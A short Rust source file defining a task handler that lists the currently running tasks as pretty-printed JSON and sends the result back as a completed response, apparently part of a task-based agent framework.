use crate::structs::Task;
use crate::tasks;

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let running = tasks::get_running_tasks();
    response.user_output = serde_json::to_string_pretty(&running).unwrap_or_else(|_| "[]".to_string());
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
